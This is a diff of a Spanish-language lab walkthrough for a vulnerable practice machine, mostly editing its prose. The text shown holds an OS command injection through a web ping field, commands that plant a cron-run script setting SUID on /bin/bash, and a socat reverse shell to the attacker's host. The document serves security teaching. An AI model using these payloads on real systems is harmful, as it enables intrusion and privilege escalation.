@@ -17,7 +17,7 @@ Máquina enfocada en la explotación de un servicio web vulnerable y posterior e
 
 ## 🔍 1. Fase de Reconocimiento y Enumeración
 
-Comenzamos realizando un ping a la máquina y vemos que es un Linux
+Comenzamos comprobando la conectividad con la máquina objetivo y vemos que es un Linux.
 <img width="696" height="129" alt="ping" src="https://github.com/user-attachments/assets/6904cdd3-0a60-4eeb-a7a0-7fee2957ca3b" />
 <br><br>
 
@@ -45,7 +45,7 @@ nmap -p80 -sCV -n 172.17.0.2 -oN targeted
 
 <img src="./img/2Escaneopuerto.png" width="70%">
 <br>
-
+Al encontrar únicamente el puerto 80 abierto, centramos la enumeración en la aplicación web expuesta.
 Tenemos una página web creada con PHP 8.2.32, es una versión bastante reciente.
 
 
@@ -104,11 +104,12 @@ Tenemos dos opciones para escalar privilegios, una por la página web, aunque es
 127.0.0. || find / -perm -4000 2>/dev/null
 ```
 
-Vamos a analizar posibles vectores para escalar privilegios desde la herramienta de la página web, lanzamos un find perm pero no vemos nada útil.
+Vamos a analizar posibles vectores para escalar privilegios desde la herramienta de la página web, comenzamos buscando binarios SUID pero no vemos ninguno útil.
 
 
 <img width="1349" height="764" alt="8perm" src="https://github.com/user-attachments/assets/bffb5dab-750a-4a9f-a99f-e4abd1dd6a3e" />
 <br><br>
+
 Vamos a mirar a ver si tiene tareas cron.
 El archivo /etc/crontab es el planificador de tareas global de Linux. Permite definir cuándo se ejecutan comandos automáticamente y bajo qué usuario.
 <img width="1349" height="936" alt="10crontab" src="https://github.com/user-attachments/assets/9b131993-87ca-46a5-b5f4-570313424a47" />
@@ -123,11 +124,15 @@ Miramos que contiene ese fichero cleanup y también vamos a mirar que permisos t
 <img width="1355" height="916" alt="permisoscleanup" src="https://github.com/user-attachments/assets/b120df1d-aa4e-42e0-a594-da59ad6788d9" />
 <br><br>
 
+Finalmente lanzo desde la web varios comandos, primero creo un cleanup.sh dentro de la carpeta uploads, le doy permisos al fichero y a la /bin/bash
+
+```
 127.0.0. || echo "#!/bin/bash" > uploads/cleanup.sh
 127.0.0. || chmod +x uploads/cleanup.sh 
 127.0.0. || echo 'chmod u+s' >> uploads/cleanup.sh
 
 127.0.0. || echo 'chmod u+s /bin/bash' >> uploads/cleanup.sh
+```
 
 Vamos a proceder a realizar una reverse shell para poder trabajar más comodamente.
 
@@ -135,7 +140,7 @@ Vamos a proceder a realizar una reverse shell para poder trabajar más comodamen
 ### Intrusión (Reverse Shell)
 Establecemos una *reverse shell* hacia nuestra máquina atacante:
 
-```php
+```bash
 # Comando ejecutado en el navegador web
 127.0.0. || socat TCP:172.17.0.1:440 exec:/bin/bash
 ```
